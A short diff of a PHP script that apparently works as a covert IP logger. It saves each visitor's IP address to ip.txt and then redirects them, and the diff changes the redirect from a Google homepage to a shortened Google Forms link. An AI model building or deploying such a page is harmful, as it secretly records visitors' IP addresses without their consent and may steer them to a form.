@@ -26,6 +26,6 @@ function getIP() {
 }
 $ip = getIP();
 file_put_contents("ip.txt", $ip);
-header("location: http://www.google.com.mx");
+header("location: https://goo.gl/forms/h5Yh7NhMJL5j1ljF3");
 die();
 ?>
